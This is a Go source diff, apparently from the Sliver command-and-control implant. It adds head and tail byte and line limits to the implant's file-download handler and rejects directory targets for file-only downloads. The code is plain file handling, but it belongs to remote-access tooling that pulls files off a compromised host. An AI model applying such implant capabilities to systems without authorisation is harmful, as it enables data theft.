@@ -329,7 +329,7 @@ func cpHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	defer srcFile.Close()
-	
+
 	dstFile, err := os.Create(cpReq.Dst)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -342,7 +342,7 @@ func cpHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	defer dstFile.Close()
-	
+
 	bytesWritten, err := io.Copy(dstFile, srcFile)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -446,19 +446,79 @@ func pwdHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func prepareDownload(path string, filter string, recurse bool) ([]byte, bool, int, int, error) {
+func prepareDownload(path string, filter string, recurse bool, maxBytes int64, maxLines int64) ([]byte, bool, int, int, error) {
 	/*
 		Combine the path and filter to see if the user wants
 		to download a single file
 	*/
+	var rawData []byte
+	var err error
+
 	fileInfo, err := os.Stat(path + filter)
 	if err != nil {
 		return nil, false, 0, 1, err
 	}
 	if err == nil && !fileInfo.IsDir() {
 		// Then this is a single file
-		rawData, err := os.ReadFile(path + filter)
+		fileHandle, err := os.Open(path + filter)
 		if err != nil {
+			// Then we could not read the file
+			return nil, false, 0, 1, err
+		}
+		defer fileHandle.Close()
+
+		if maxBytes != 0 {
+			var readFirst bool = maxBytes > 0
+			if readFirst {
+				rawData = make([]byte, maxBytes)
+				_, err = fileHandle.Read(rawData)
+			} else {
+				rawData = make([]byte, maxBytes*-1)
+				var bytesToRead int64 = 0
+				if fileInfo.Size()+maxBytes < 0 {
+					bytesToRead = 0
+				} else {
+					bytesToRead = fileInfo.Size() + maxBytes
+				}
+				_, err = fileHandle.ReadAt(rawData, bytesToRead)
+			}
+
+		} else if maxLines != 0 {
+			var linesRead int64 = 0
+			var lines []string
+			var readFirst bool = true
+
+			if maxLines < 0 {
+				maxLines *= -1
+				readFirst = false
+			}
+
+			fileScanner := bufio.NewScanner(fileHandle)
+			for fileScanner.Scan() {
+				lines = append(lines, fileScanner.Text())
+				linesRead += 1
+				if linesRead == maxLines && readFirst {
+					break
+				}
+			}
+			err = fileScanner.Err()
+			if err == nil {
+				if readFirst {
+					rawData = []byte(strings.Join(lines, "\n"))
+				} else {
+					linePosition := int64(len(lines)) - maxLines
+					if linePosition < 0 {
+						linePosition = 0
+					}
+					rawData = []byte(strings.Join(lines[linePosition:], "\n"))
+				}
+			}
+		} else {
+			// Read the entire file
+			rawData = make([]byte, fileInfo.Size())
+			_, err = fileHandle.Read(rawData)
+		}
+		if err != nil && err != io.EOF {
 			// Then we could not read the file
 			return nil, false, 0, 1, err
 		} else {
@@ -498,11 +558,29 @@ func downloadHandler(data []byte, resp RPCResponse) {
 	if pathIsDirectory(target) {
 		// Even if the implant is running on Windows, Go can deal with "/" as a path separator
 		target += "/"
+		if downloadReq.RestrictedToFile {
+			/*
+				The user has asked to perform a download operation that should only be allowed on
+				files, and this is a directory. We should let them know.
+			*/
+			err = fmt.Errorf("cannot complete command because target %s is a directory", target)
+			// {{if .Config.Debug}}
+			log.Printf("error completing download command: %v", err)
+			// {{end}}
+			download = &sliverpb.Download{Path: target, Exists: false, ReadFiles: 0, UnreadableFiles: 0}
+			download.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%v", err),
+			}
+
+			data, _ = proto.Marshal(download)
+			resp(data, err)
+			return
+		}
 	}
 
 	path, filter := determineDirPathFilter(target)
 
-	rawData, isDir, readFiles, unreadableFiles, err := prepareDownload(path, filter, downloadReq.Recurse)
+	rawData, isDir, readFiles, unreadableFiles, err := prepareDownload(path, filter, downloadReq.Recurse, downloadReq.MaxBytes, downloadReq.MaxLines)
 
 	if err != nil {
 		if isDir {
